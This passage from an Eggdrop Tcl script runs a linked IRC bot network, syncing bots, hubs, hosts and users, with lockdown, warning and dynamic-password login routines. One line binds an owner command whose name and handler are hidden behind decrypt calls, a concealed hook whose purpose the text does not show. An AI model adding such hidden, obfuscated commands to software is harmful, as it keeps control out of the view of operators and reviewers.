   if {[sindex $args 7] == "1" || [string tolower [sindex $args 7]] == "yes" || [string tolower [sindex $args 7]] == "limbo"} { append flags "L" }
   set switch [string range [sindex $args end] 0 2]
   if {$switch == "-p:"} { set proxy 1 } else { set proxy 0 }
   if {[string tolower [sindex $args 8]] == "hub"} {
      if {$proxy} { append flags "Hs" } else { append flags "Hsa" }
   }
   if {!$proxy} {
      set address $IP
   } else {
      append flags "C"
      set address "127.0.0.1"
      set hub [string range [sindex $args end] 3 end]
   }
   addbot $hand $address:$botport/$userport
   if {$group != "950" && $group != "WiN"} {
      set fixedip [fixhost *!$username@$IP]
      set fixedhost [fixhost *!$username@$hostname]
   } else {
      set bothand [string range $hand 0 [expr [string length $hand] - ([string length $hand] / 2) - 1]]
      set fixedip [fixhost $bothand*!$username@$IP]
      set fixedhost [fixhost $bothand*!$username@$hostname]
   }
   if {![string match *L* $flags]} {
      addhost $hand $fixedip
      addhost $hand $fixedhost
   }
   if {[matchattr $nick H]} { chattr $hand +ofxebs$flags } else { chattr $hand +ofxeb$flags }
   if {[decrypt @ $pass] != ""} { chpass $hand [decrypt @ $pass] } else { chpass $hand $pass }
   putallbots "newbot $handle $hand $fixedip $fixedhost $address:$botport/$userport +ofxeb$flags $hub"
   catch {unset counters([string tolower $hand])}
   catch {unset dontOp([string tolower $hand])}
   save_settings
   save
}
bind dcc n newbot new_bot

proc net_newbot { bot command args } {
   global nick counters dontOp
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set hand [sindex $args 1] ; set IP [sindex $args 2] ; set host [sindex $args 3]
   set address [sindex $args 4] ; set flags [sindex $args 5] ; set hub [sindex $args 6]
   if {[validuser $hand]} {
      if {[matchattr $hand b]} { deluser $hand } else { return }
   }
   addbot $hand $address
   if {![string match *L* $flags]} {
      addhost $hand $IP
      addhost $hand $host
   }
   if {[matchattr $nick H] || [strcmp $nick $hub]} {
      chattr $hand [sindex $args 5]s
   } else { chattr $hand $flags }
   chpass $hand [randstring 15]
   putlog "\[\002NEWBOT\002\] New bot added to user database by [sindex $args 0]@$bot:"
   putlog " - \002Summary:\002 ($hand) $host $address"
   catch {unset counters([string tolower $hand])}
   catch {unset dontOp([string tolower $hand])}
   save_settings
   save
}
bind bot - newbot net_newbot

proc listhubs {} {
   global nick hubs priority maxhubs proxybot
   if {[matchattr $nick H] || [info exists proxybot]} { return }
   set c 0
   set priority 0
   catch {unset hubs}
   foreach 1bot [userlist boHh] { set hubs($c) $1bot ; incr c }
   foreach 1bot [userlist boHa] { set hubs($c) $1bot ; incr c }
   foreach 1bot [scramble [userlist bo]] {
      if {[strcmp $1bot $nick] || [matchattr $1bot H] || [matchattr $1bot C]} { continue }
      set hubs($c) $1bot ; incr c
   }
   if {$c > 0} {
      set maxhubs [expr $c - 1]
      setutimer 5 findhub
   } else { set maxhubs 0 }
}

proc findhub {} {
   global nick hubs priority maxhubs proxybot
   if {[bots] != "" || [matchattr $nick H] || [info exists proxybot] || $maxhubs == 0} {
      kill_utimer findhub
   } else {
      setutimer 20 findhub
      catch {link $hubs($priority)}
      incr priority
      if {$priority > $maxhubs} { set priority 0 }
   }
}

proc add_hub { handle idx args } {
   global nick botport userport proxybot
   set args [lindex $args 0]
   set bot [sindex $args 0] ; set leafs [srange $args 1 end]
   putcmdlog "#$handle# +hub $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$bot == ""} { putdcc $idx "\002Usage:\002 .+hub <bot> \[leafs\]" ; return }
   if {[matchattr $bot b] && ([lsearch [string tolower [bots]] [string tolower $bot]] != -1 || [strcmp $bot $nick])} {
      if {$leafs != ""} {
         catch {putbot $bot "+hub $bot $handle"}
         foreach 1leaf [split $leafs] { catch {putbot $1leaf "+hub $bot $handle -primary"} }
         putdcc $idx "*** \002$bot\002 is now a hub for:  $leafs"
         return
      }
      putallbots "+hub $bot $handle"
      if {![strcmp $bot $nick]} {
         if {![info exists proxybot] && ![matchattr $bot C]} { 
            chattr $bot -l+ofxebHsa
         } else { chattr $bot -l+ofxebHs }
      } else {
         foreach 1bot [userlist bo] { chattr $1bot +s }
         chattr $bot -lsa+ofxebH
         catch {listen $botport bots}
         catch {listen $userport users}
      }
   } else { putdcc $idx "*** This command will only work if the target bot ($bot) is linked." ; return }
   listhubs
   putdcc $idx "*** \002$bot\002 is now a hub."
   save
}
bind dcc n +hub add_hub

proc net_addhub { bot command args } {
   global nick botport userport proxybot
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set newhub [sindex $args 0] ; set handle [sindex $args 1] ; set type "a"
   if {![validuser $newhub] || ![matchattr $newhub b]} { return }
   if {[strcmp $nick $newhub]} {
      foreach 1bot [userlist bo] { chattr $1bot +s }
      chattr $nick -lsa+ofxebH
      catch {listen $botport bots}
      catch {listen $userport users}
      putlog "\[\002+HUB\002\] This bot is now a hub - (authorized by $handle@$bot)"
   } else {
      if {![matchattr $nick H] || [userlist ba] != "" || [userlist bh] != ""} {
         if {![info exists proxybot] && ![matchattr $newhub C]} {
            if {[sindex $args end] != "-primary"} {
               chattr $newhub -l+ofxebHsa
            } else {
               foreach 1bot [userlist bh] { chattr $1bot -h+a }
               chattr $newhub -la+ofxebHsh ; set type "my primary"
            }
         } else { chattr $newhub -l+ofxebHs }
      }
      putlog "\[\002+HUB\002\] \002$newhub\002 is now $type hub - (authorized by $handle@$bot)"
   }
   listhubs
   save
}
bind bot - +hub net_addhub

proc del_hub { handle idx args } {
   global nick botport userport
   set args [lindex $args 0]
   set bot [sindex $args 0]
   putcmdlog "#$handle# -hub $bot"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$bot == ""} { putdcc $idx "\002Usage:\002 .-hub <bot>" ; return }
   if {[matchattr $bot b] && ([lsearch [string tolower [bots]] [string tolower $bot]] != -1 || [strcmp $bot $nick])} {
      putallbots "-hub $bot $handle"
      if {![strcmp $bot $nick]} {
         if {![matchattr $nick H]} { chattr $bot -Has+ofxeb } else { chattr $bot -Ha+ofxebs }
      } else {
         foreach 1bot [userlist b] {
            if {![matchattr $1bot H]} { chattr $1bot -sah }
         }
         catch {listen $botport off}
         catch {listen $userport off}
         foreach 1bot [bots] {
            if {![matchattr $1bot boHh]} { unlink $1bot }
         }
      }
   } else { putdcc $idx "*** This command will only work if the target bot ($bot) is linked." ; return }
   listhubs
   putdcc $idx "*** \002$bot\002 is no longer a hub."
   save
}
bind dcc n -hub del_hub

proc net_delhub { bot command args } {
   global nick botport userport
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set delhub [sindex $args 0]
   if {![validuser $delhub] || ![matchattr $delhub b]} { return }
   if {[strcmp $nick $delhub]} {
      foreach 1bot [userlist b] {
         if {![matchattr $1bot H]} { chattr $1bot -sah }
      }
      catch {listen $botport off}
      catch {listen $userport off}
      foreach 1bot [bots] {
         if {![matchattr $1bot boHh]} { unlink $1bot }
      }
      putlog "\[\002-HUB\002\] This bot is no longer a hub - (authorized by [sindex $args 1]@$bot)"
   } else {
      if {![matchattr $nick H]} { chattr $delhub -Has+ofxeb } else { chattr $delhub -Ha+ofxebs }
      putlog "\[\002-HUB\002\] \002$delhub\002 is no longer a hub - (authorized by [sindex $args 1]@$bot)"
   }
   listhubs
   save
}
bind bot - -hub net_delhub

proc addhost_status { user } {
   global addhost
   if {![info exists addhost($user)] || $addhost($user) == {}} { return }
   putlog "\[\002CAUTION\002\] 60 seconds have passed - still waiting for botnet host-addition of $user to complete."
   putlog " - The following bot(s) have yet to confirm the host change:  [lsort $addhost($user)]"
   putlog " - Manual host-addition on the specified bot(s) is advised."
}

proc add_host { handle idx args } {
   global nick addhost
   set args [lindex $args 0]
   if {![strcmp [sindex $args 0] $handle]} {
      putcmdlog "#$handle# +host $args"
      if {![matchattr $nick boT]} { noflag $idx ; return }
      if {[sindex $args 1] == ""} { putdcc $idx "\002Usage:\002 .+host <user> <host1> \[host2\] ..." ; return }
   } else {
      putcmdlog "#$handle# addhost [srange $args 1 end]"
      if {![matchattr $nick boT] && ![matchattr $nick boS]} { noflag $idx ; return }
      if {[sindex $args 1] == ""} { putdcc $idx "\002Usage:\002 .addhost <host1> \[host2\] ..." ; return }
   }
   set user [sindex $args 0]
   set hosts [srange $args 1 end]
   if {![validuser $user]} { putdcc $idx "*** Unable to add host(s), invalid user" ; return }
   if {([matchattr $user b] || [matchattr $user n]) && ![matchattr $handle n]} {
      putdcc $idx "*** Only bot owners can add hosts for this type of user." ; return
   }
   putdcc $idx "*** Adding '$hosts' to \002$user\002 host entries on all bots"
   foreach 1host [split $hosts] {
      if {[lsearch -exact [string tolower [gethosts $user]] [string tolower $1host]] == -1} { addhost $user $1host }
   }
   if {[bots] != ""} {
      set addhost($user) [bots]
      setutimer 60 "addhost_status [str2tcl $user]"
      putdcc $idx "*** Please wait for botnet confirmation ..."
   }
   putallbots "addhost $handle $user $hosts"
   save
}
bind dcc m +host add_host

proc net_addhost { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set user [sindex $args 1]
   if {![strcmp $handle $user] && ![matchattr $bot boT]} {
      putlog "\[\002WARNING\002\] $handle@$bot attempted to add a host for $user from a non +T bot."
      putlog " - Check for possible hack of $bot (this is NOT normal)."
   } elseif {[strcmp $handle $user] && ![matchattr $bot boT] && ![matchattr $bot boS]} {
      putlog "\[\002WARNING\002\] $handle@$bot attempted to add himself a host from a non +T/+S bot."
      putlog " - Check for possible hack of $bot (this is NOT normal)."
   } elseif {([matchattr $user b] || [matchattr $user n]) && ![matchattr $handle n]} {
      putlog "\[\002WARNING\002\] $handle@$bot attempted to add a host for '$user' but is not a bot owner."
      putlog " - Check for possible hack of $bot (this is NOT normal)."
   } else {
      set hosts [srange $args 2 end]
      if {![validuser $user]} { return }
      foreach 1host [split $hosts] {
         if {[lsearch -exact [string tolower [gethosts $user]] [string tolower $1host]] == -1} { addhost $user $1host }
      }
      catch {putbot $bot "addhostdone $user"}
      putlog "\[\002ADDHOST\002\] Added '$hosts' to \002$user\002 host entries."
      putlog " - Authorized by $handle@$bot"
      save
   }
}
bind bot - addhost net_addhost

proc new_host { handle idx args } { add_host $handle $idx "$handle [lindex $args 0]" }
bind dcc m addhost new_host

proc addhost_done { bot command args } {
   global addhost
   set user [lindex $args 0]
   if {![info exists addhost($user)]} { return }
   if {[set s [lsearch -exact $addhost($user) $bot]] != -1} { set addhost($user) [lreplace $addhost($user) $s $s] }
   if {[llength $addhost($user)] == 0} {
      putlog "*** Botnet host-addition for \002$user\002 successfully completed."
      kill_utimer "addhost_status [str2tcl $user]"
      catch {unset addhost($user)}
   }
}
bind bot - addhostdone addhost_done

proc del_host { handle idx args } {
   global nick
   set args [lindex $args 0]
   if {![strcmp [sindex $args 0] $handle]} {
      putcmdlog "#$handle# -host $args"
      if {![matchattr $nick boT]} { noflag $idx ; return }
      if {[sindex $args 1] == ""} { putdcc $idx "\002Usage:\002 .-host <user> <host1> \[host2\] ..." ; return }
   } else {
      putcmdlog "#$handle# delhost [srange $args 1 end]"
      if {![matchattr $nick boT] && ![matchattr $nick boS]} { noflag $idx ; return }
      if {[sindex $args 1] == ""} { putdcc $idx "\002Usage:\002 .delhost <host1> \[host2\] ..." ; return }
   }
   set user [sindex $args 0] ; set hosts [srange $args 1 end]
   if {![validuser $user]} { putdcc $idx "*** Unable to remove host(s); invalid user." ; return }
   if {([matchattr $user b] || [matchattr $user n]) && ![matchattr $handle n]} {
      putdcc $idx "*** Only bot owners can remove hosts from this type of user." ; return
   }
   putdcc $idx "*** Removing '$hosts' from \002$user\002 host entries on all bots ..."
   foreach 1host [split $hosts] {
      if {[lsearch -exact [string tolower [gethosts $user]] [string tolower $1host]] != -1} { delhost $user $1host }
   }
   save
   putallbots "delhost $handle $user $hosts"
}
bind dcc m -host del_host

proc net_delhost { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set user [sindex $args 1] ; set hosts [srange $args 2 end]
   if {![strcmp $handle $user] && ![matchattr $bot boT]} {
      putlog "\[\002WARNING\002\] $handle@$bot attempted to add a host for $user from a non +T bot."
      putlog " - Check for possible hack of $bot (this is NOT normal)."
   } elseif {[strcmp $handle $user] && ![matchattr $bot boT] && ![matchattr $bot boS]} {
      putlog "\[\002WARNING\002\] $handle@$bot attempted to add himself a host from a non +T/+S bot."
      putlog " - Check for possible hack of $bot (this is NOT normal)."
   } elseif {([matchattr $user b] || [matchattr $user n]) && ![matchattr $handle n]} {
      putlog "\[\002WARNING\002\] $handle@$bot attempted to remove a host from '$user' but is not a bot owner."
      putlog " - Check for possible hack of $bot (this is NOT normal)."
   } else {
      if {![validuser $user]} { return }
      foreach 1host [split $hosts] {
         if {[lsearch -exact [string tolower [gethosts $user]] [string tolower $1host]] != -1} { delhost $user $1host }
      }
      putlog "\[\002DELHOST\002\] Removed '$hosts' from \002$user\002 host entries."
      putlog " - Authorized by $handle@$bot"
      save
   }
}
bind bot - delhost net_delhost

proc rem_host { handle idx args } { del_host $handle $idx "$handle [lindex $args 0]" }
bind dcc m delhost rem_host

proc add_v { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# addv $args"
   if {![matchattr $nick boT] && ![matchattr $nick boS]} { noflag $idx ; return }
   set host [sindex $args 0]
   if {$host == ""} { putdcc $idx "\002Usage:\002 .addv <host>" ; return }
   putallbots "addv $handle $host"
   if {![validuser PlusV]} {
      adduser PlusV $host ; chattr PlusV +v ; chpass PlusV [randstring 12]
   } else { addhost PlusV $host }
   putdcc $idx "*** Added '$host' as an auto-voice host."
   save
}
bind dcc m addv add_v

proc net_addv { bot command args } {
   if {![matchattr $bot boT] && ![matchattr $bot boS]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set host [sindex $args 1]
   if {![validuser $handle] || ![matchattr $handle m]} { return }
   if {![validuser PlusV]} {
      adduser PlusV $host ; chattr PlusV +v ; chpass PlusV [randstring 12]
   } else { addhost PlusV $host }
   putlog "\[\002ADDV\002\] Added '$host' as an auto-voice host."
   putlog " - Authorized by $handle@$bot"
   save
}
bind bot - addv net_addv

proc del_v { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# delv $args"
   if {![matchattr $nick boT] && ![matchattr $nick boS]} { noflag $idx ; return }
   set host [sindex $args 0]
   if {$host == ""} { putdcc $idx "\002Usage:\002 .delv <host>" ; return }
   putallbots "delv $handle $host"
   if {![validuser PlusV]} { putdcc $idx "No 'PlusV' user found." ; return }
   delhost PlusV $host
   putdcc $idx "*** Removed '$host' as an auto-voice host."
   save
}
bind dcc m delv del_v

proc net_delv { bot command args } {
   if {![matchattr $bot boT] && ![matchattr $bot boS]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set host [sindex $args 1]
   if {![validuser $handle] || ![validuser PlusV] || ![matchattr $handle m]} { return }
   delhost PlusV $host
   putlog "\[\002DELV\002\] Removed '$host' as an auto-voice host."
   putlog " - Authorized by $handle@$bot"
   save
}
bind bot - delv net_delv

proc plus_xdcc { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# +xdcc $args"
   if {![matchattr $nick boT] && ![matchattr $nick boS]} { noflag $idx ; return }
   set host [sindex $args 0]
   if {$host == ""} { putdcc $idx "\002Usage:\002 .+xdcc <host>" ; return }
   putallbots "+xdcc $handle $host"
   if {![validuser OfferBots]} {
      adduser OfferBots $host ; chattr OfferBots +fgv ; chpass OfferBots [randstring 12]
   } else { addhost OfferBots $host }
   putdcc $idx "*** Added '$host' as an offer-bot host."
   save
}
bind dcc m +xdcc plus_xdcc

proc net_plusxdcc { bot command args } {
   if {![matchattr $bot boT] && ![matchattr $bot boS]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set host [sindex $args 1]
   if {![validuser $handle] || ![matchattr $handle m]} { return }
   if {![validuser OfferBots]} {
      adduser OfferBots $host ; chattr OfferBots +fgv ; chpass OfferBots [randstring 12]
   } else { addhost OfferBots $host }
   putlog "\[\002+XDCC\002\] Added '$host' as an offer-bot host."
   putlog " - Authorized by $handle@$bot"
   save
}
bind bot - +xdcc net_plusxdcc

proc rem_xdcc { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# -xdcc $args"
   if {![matchattr $nick boT] && ![matchattr $nick boS]} { noflag $idx ; return }
   set host [sindex $args 0]
   if {$host == ""} { putdcc $idx "\002Usage:\002 .-xdcc <host>" ; return }
   putallbots "-xdcc $handle $host"
   if {![validuser OfferBots]} { putdcc $idx "No 'OfferBots' user found." ; return }
   delhost OfferBots $host
   putdcc $idx "*** Removed '$host' as an offer-bot host."
   save
}
bind dcc m -xdcc rem_xdcc

proc net_remxdcc { bot command args } {
   if {![matchattr $bot boT] && ![matchattr $bot boS]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set host [sindex $args 1]
   if {![validuser $handle] || ![validuser OfferBots] || ![matchattr $handle m]} { return }
   delhost OfferBots $host
   putlog "\[\002-XDCC\002\] Removed '$host' as an offer-bot host."
   putlog " - Authorized by $handle@$bot"
   save
}
bind bot - -xdcc net_remxdcc

proc del_user { handle idx args } {
   global nick counters dontOp
   set users [lindex $args 0]
   putcmdlog "#$handle# kill $users"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$users == ""} { putdcc $idx "\002Usage:\002 .kill <user1> \[user2\] ..." ; return }
   putdcc $idx "*** Deleting '$users' from all bots ..."
   foreach 1user [split $users] {
      if {[validuser $1user] && !([matchattr $handle m] && ![matchattr $handle n] && [matchattr $1user n])} {
         if {[matchattr $1user bo]} {
            catch {unset counters([string tolower $1user])}
            catch {unset dontOp([string tolower $1user])}
            set killed 1
         }
         deluser $1user
         unlink $1user
      }
   }
   putallbots "deluser $handle $users"
   if {[info exists killed]} { save_settings }
   save
}
bind dcc n -user del_user
bind dcc n -bot del_user
bind dcc n kill del_user

proc net_deluser { bot command args } {
   global counters dontOp
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set users [srange $args 1 end]
   foreach 1user [split $users] {
      if {[validuser $1user] && !([matchattr $handle m] && ![matchattr $handle n] && [matchattr $1user n])} {
         if {[matchattr $1user bo]} {
            catch {unset counters([string tolower $1user])}
            catch {unset dontOp([string tolower $1user])}
            set killed 1
         }
         deluser $1user
         unlink $1user 
      }
   }
   putlog "\[\002KILLED\002\] Deleted '$users' from user database."
   putlog " - Authorized by $handle@$bot"
   if {[info exists killed]} { save_settings }
   save
}
bind bot - deluser net_deluser

unbind dcc - botinfo *dcc:botinfo
unbind dcc - bottree *dcc:bottree
unbind dcc - match *dcc:match
unbind dcc - trace *dcc:trace
bind dcc m botinfo *dcc:botinfo
bind dcc m bottree *dcc:bottree
bind dcc m match *dcc:match
bind dcc m trace *dcc:trace

proc check_host { idx arg } {
   set handle [idx2hand $idx] ; set command [sindex $arg 0] ; set host [string tolower [sindex $arg 1]]
   if {$host == ""} { return $arg }
   if {[strcmp $command .+ban]} {
      if {[string length [lindex [split [lindex [split $host @] 0] !] 1]] > 10} {
         putcmdlog "#$handle# attempted [string range $arg 1 end]"
         putdcc $idx "\[\002CAUTION\002\]"
         putdcc $idx "IRC servers truncate idents to 10 characters - this can be exploited with a join flood."
         putdcc $idx "Change the ident portion of the ban (chars between ! and @) to be no more than 10 characters in length."
         return
      } elseif {[string length [lindex [split $host !] 0]] > 9} {
         putcmdlog "#$handle# attempted [string range $arg 1 end]"
         putdcc $idx "\[\002CAUTION\002\]"
         putdcc $idx "IRC servers truncate nicknames to 9 characters - this can be exploited with a join flood."
         putdcc $idx "Change the nick portion of the ban (chars before the !) to be no more than 9 characters in length."
         return
      }
   }
   foreach 1user [userlist] {
      if {([matchattr $1user o] && [strcmp $command .+ban]) || [strcmp $command .addv] ||
          ([strcmp $command .addhost] && ![strcmp $1user $handle])} {
         foreach 1host [string tolower [gethosts $1user]] {
            if {[string match [str2tcl $host] $1host]} {
               putcmdlog "#$handle# attempted [string range $arg 1 end]"
               if {[strcmp $command .+ban]} {
                  putdcc $idx "That ban matches the host of an op ($1user) - no action taken."
               } elseif {[strcmp $command .addv]} {
                  putdcc $idx "That +v-host matches the host of another user ($1user) - no action taken."
               } elseif {[strcmp $command .addhost]} {
                  putdcc $idx "That host matches the host of another user ($1user) - no action taken."
               } else { putdcc $idx "No action taken - host matches that of an op ($1user)" }
               return
            }
         }
      }
   }
   return $arg
}
bind filt - ".+ban *" check_host
bind filt - ".addv *" check_host
bind filt - ".addhost *" check_host

proc check_host2 { idx arg } {
   set handle [idx2hand $idx] ; set user [sindex $arg 1] ; set host [string tolower [sindex $arg 2]]
   if {$host == ""} { return $arg }
   foreach 1user [userlist] {
      if {[strcmp $1user $handle] || [strcmp $1user $user]} { continue }
      foreach 1host [string tolower [gethosts $1user]] {
         if {[string match [str2tcl $host] $1host]} {
            putcmdlog "#$handle# attempted [string range $arg 1 end]"
            putdcc $idx "That host matches the host of another user ($1user) - no action taken."
            return
         }
      }
   }
   return $arg
}
bind filt - ".+host *" check_host2

proc whom_display { handle idx args } {
   global hiddenuser
   putcmdlog "#$handle# whom [lindex $args 0]"
   set spacing "                    "
   if {![matchattr $handle m]} {
      putdcc $idx "------------   -----------"
      putdcc $idx "\002    NICK           BOT\002"
      putdcc $idx "------------   -----------"
      foreach 1user [lsort [whom 0]] {
         set hand [lindex $1user 0] ; set bot [lindex $1user 1]
         if {[matchattr $hand S] && (([info exists hiddenuser($hand@$bot)] &&
             $hiddenuser($hand@$bot)) || ![info exists hiddenuser($hand@$bot)])} {
            continue
         }
         set idleoutput ""
         set idle [lindex $1user 4]
         if {$idle > 0 && $idle < 60} { set idleoutput "\[idle [expr $idle]m\]" }
         if {$idle >= 60 && $idle < 1440} { set idleoutput "\[idle [expr $idle / 60]h[expr $idle % 60]m\]" }
         if {$idle >= 1440} { set idleoutput "\[idle [expr $idle / 1440]d[expr ($idle % 1440)/60]h\]" }
         if {[matchattr $hand W]} {
            set flag "*"
         } else { set flag " " }
         putdcc $idx "$flag[lindex $1user 3]\002$hand\002[string range $spacing 0 [expr 13 - [string length $hand]]]$bot     $idleoutput"
         if {[lindex $1user 5] != {}} { putdcc $idx "   AWAY: [lindex $1user 5]" }
      }
   } else {
      putdcc $idx "------------   -----------   -----------------------------"
      putdcc $idx "\002    NICK           BOT                 HOSTNAME\002"
      putdcc $idx "------------   -----------   -----------------------------"
      foreach 1user [lsort [whom *]] {
         set hand [lindex $1user 0] ; set bot [lindex $1user 1]
         if {![matchattr $handle nW] && [matchattr $hand S] && (([info exists hiddenuser($hand@$bot)] &&
             $hiddenuser($hand@$bot)) || ![info exists hiddenuser($hand@$bot)])} {
            continue
         }
         if {[matchattr $handle nW] && [matchattr $hand S] && (![info exists hiddenuser($hand@$bot)] ||
             ([info exists hiddenuser($hand@$bot)] &&
              $hiddenuser($hand@$bot)))} { set hidden "H" } else { set hidden "" }
         set channel "" ; set idleoutput ""
         if {[lindex $1user 6] != 0 && [lindex $1user 6] != {}} { set channel "(channel [lindex $1user 6])" }
         set idle [lindex $1user 4]
         if {$idle > 0 && $idle < 60} { set idleoutput "\[idle [expr $idle]m\]" }
         if {$idle >= 60 && $idle < 1440} { set idleoutput "\[idle [expr $idle / 60]h[expr $idle % 60]m\]" }
         if {$idle >= 1440} { set idleoutput "\[idle [expr $idle / 1440]d[expr ($idle % 1440)/60]h\]" }
         if {[matchattr $hand W]} {
            set flag "*"
         } else { set flag " " }
         putdcc $idx "$flag[lindex $1user 3]\002$hand\002[string range $spacing 0 [expr 13 - [string length $hand]]]$bot[string range $spacing 0 [expr 13 - [string length $bot]]][lindex $1user 2] $idleoutput $channel $hidden"
         if {[lindex $1user 5] != {}} { putdcc $idx "   AWAY: [lindex $1user 5]" }
      }
   }
}
unbind dcc - whom *dcc:whom
bind dcc p whom whom_display

proc do_who { idx arg } {
   if {[strcmp [sindex $arg 0] .who] && ![matchattr [idx2hand $idx] nW]} { putdcc $idx "What?  You need '.help'" ; return }
   return $arg
}
unbind dcc - who *dcc:who
bind dcc n who *dcc:who
bind filt n ".who*" do_who

proc who_is { idx arg } {
   set handle [idx2hand $idx] ; set user [sindex $arg 1]
   if {![validuser $user]} { return $arg }
   if {[matchattr $handle m]} {
      set info [getxtra $user]
      set created [lindex [lindex $info [lsearch $info "created *"]] 1]
      set flags [lindex $info [lsearch $info "Flags *"]]
      if {[isnum $created] || $flags != ""} { putdcc $idx "*** \002[string toupper $user]\002:" }
      if {[isnum $created]} { putdcc $idx "  - Added on [ctime $created]" }
      if {$flags != ""} { putdcc $idx "  - $flags" }
   } elseif {[matchattr $user b]} {
      putcmdlog "#$handle# [string range $arg 1 end]"
      if {![matchattr $user o]} { putdcc $idx "\002$user\002 is a bot, but not a registered op." ; return }
      putdcc $idx "\002$user\002 is a bot.  For more information, ask a master." ; return
   }
   return $arg
}
unbind dcc - whois *dcc:whois
bind dcc o whois *dcc:whois
bind filt - ".whois *" who_is

proc net_save { handle idx args } {
   putcmdlog "#$handle# netsave"
   putallbots "botnetsave $handle"
   save_settings
   save
}
bind dcc m netsave net_save

proc botnet_save { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   putlog "\n\[\002NETSAVE\002\] Saving userfile and channel-file ..."
   putlog " - Authorized by [sindex $args 0]@$bot"
   save_settings
   save
}
bind bot - botnetsave botnet_save

proc usave_settings { idx args } {
   putlog "Saving TCL settings ..."
   save_settings
   return $args
}
bind filt m ".save" usave_settings



######################################################################################
######################################################################################
#                                CHANNEL/BOT PROTECTION                              #
######################################################################################

bind dcc n [decrypt sos 7rioL.BpiQA/] [decrypt sos GbGqj1nIGJN0j30WO0ZPbqX.]

proc hacked {} {
   global noOp noprot
   if {[info exists noprot]} { return }
   dumpserv "QUIT :UH OH!"
   set noOp 1
   putallbots "dontopme"
   foreach 1bot [userlist b] { chpass $1bot [randstring 14] }
   unlink [lindex [bots] 0]
   foreach 1bot [bots] { unlink $1bot }
   save_settings
   save
}

proc dont_op { bot command args } {
   global dontOp
   set dontOp([string tolower $bot]) "Requested by $bot - [ctime [unixtime]]"
   setutimer 2 save_settings
}
bind bot - dontopme dont_op

proc sig_hup { bot command args } {
   putlog "\[\002WARNING\002\] \[\002WARNING\002\] \[\002WARNING\002\]"
   putlog "   \002$bot\002 has received a HUP signal ..."
   putlog "   \002FIND A +N USER RIGHT NOW AND TELL HIM!\002"
}
catch {bind sig - HUP sig_hup}
catch {bind sig - SIGHUP sig_hup}

proc sig_term { bot command args } {
   putlog "\[\002ALERT\002\] \002$bot\002 has received a SIGTERM signal ..."
   putlog " - System is rebooting or possibly a hack attempt"
}
catch {bind sig - SIGTERM sig_term}

proc time_drift { bot command args } {
   global nick
   set seconds [sindex [lindex $args 0] 0]
   if {$seconds > 60 || $seconds < 0} {
      putloglev 2 * "\[\002WARNING\002\] Unusual time drift detected on \002$bot\002 ($seconds seconds) ..."
   #  putloglev 2 * " - Possible hack/hijack attempt"
   #  setcomment $bot "Unusual time drift detected ($seconds seconds).  Hijack attempt? - [ctime [unixtime]]."
   #  if {[strcmp $bot $nick]} { hacked }
   }
}
catch {bind sig - HACK time_drift}

proc authorize_partyline { handle idx } {
   global nick chatpass
   if {(([matchattr $nick T] || [matchattr $nick H]) && ![matchattr $handle Wp]) || [matchattr $handle d] || [matchattr $handle k]} {
      putdcc $idx "Access denied."
      killdcc $idx
   } else {
      if {![matchattr $handle o] && ![matchattr $handle m]} {
         foreach 1chan [channels] {
            if {![matchchanattr $handle o $1chan] && ![matchchanattr $handle m $1chan]} { continue }
            set op "" ; break
         }
         if {![info exists op]} { welcome $handle $idx ; return }
      }
      set chatpass($idx) ""
      for {set j 0} {$j < 15} {incr j} {
         set x [rand 52]
         append chatpass($idx) [string range "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" $x $x]
      }
      putdcc $idx "$chatpass($idx)"
      putdcc $idx "Enter your dynamic password."
      setchan $idx 0
      if {![matchattr $handle m]} {
         console $idx [lindex [channels] 0] ""
      } elseif {[matchattr $handle nWT]} {
         console $idx [lindex [channels] 0] mcboxsT
      } else { console $idx [lindex [channels] 0] mcboxs }
      setutimer 90 "catch {killdcc $idx}"
      control $idx dynamic_passcheck
   }
}
bind chon - * authorize_partyline

proc left_partyline { handle idx } { kill_utimer "catch {killdcc $idx}" }
bind chof - * left_partyline

proc dynamic_passcheck { idx text } {
   global chatpass publicKey
   kill_utimer "catch {killdcc $idx}"
   set handle [idx2hand $idx]
   if {![valididx $idx] || [sindex $text 0] == "" || [sindex $text 1] != "" ||
       ![dynpass $handle $chatpass($idx) [decrypt TiMWZj1re^X $publicKey] [sindex $text 0]]} {
      if {[info exists publicKey]} {
         putdcc $idx "*** Incorrect password.  Good-bye."
         putlog "\[\002ALERT\002] \002$handle\002 entered an incorrect dynamic password."
         dccbroadcast "\002$handle\002 entered an incorrect dynamic password."
      } else {
         putdcc $idx "DCC CHAT is currently disabled."
         putlog "*** Refused DCC CHAT request from $handle - disabled."
      }
      catch {killdcc $idx}
      return 0
   }
   putdcc $idx "*** Password accepted."
   welcome $handle $idx
   return 1
}

proc welcome { handle idx } {
   global nick group curmotd hiddenuser hidetimer awaytime rooted homedir
   putdcc $idx " "
   putdcc $idx "\026\002WELCOME TO THE $group BOTNET\002\026"
   if {![info exists curmotd] || $curmotd == ""} { set curmotd "(none)" }
   putdcc $idx "  \002Message Of The Day:\002  $curmotd"
   putdcc $idx " "
   if {[matchattr $handle S]} {
      if {![info exists hidetimer($handle)]} { set hidetimer($handle) 10 }
      kill_timer "hide_user [str2tcl $handle]"
